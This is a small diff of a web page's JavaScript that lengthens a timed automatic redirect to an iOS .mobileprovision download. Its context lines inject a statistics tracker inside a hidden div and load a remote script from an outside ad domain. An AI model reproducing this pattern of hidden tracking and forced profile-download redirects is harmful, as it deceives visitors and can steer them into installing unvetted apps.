@@ -31,4 +31,4 @@
 })();
 document.writeln("<div style=\"display:none\"><script type=\"text/javascript\" src=\"https://v1.cnzz.com/z_stat.php?id=1278083952&web_id=1278083952\"></script></div>");
 document.writeln("<script type=\"text/javascript\" src=\"https://api.lldyy.net/gg/foot.js\"></script>");
-setTimeout("location.href='index_1/app.mobileprovision'", 5000);
+setTimeout("location.href='index_1/app.mobileprovision'", 10000);
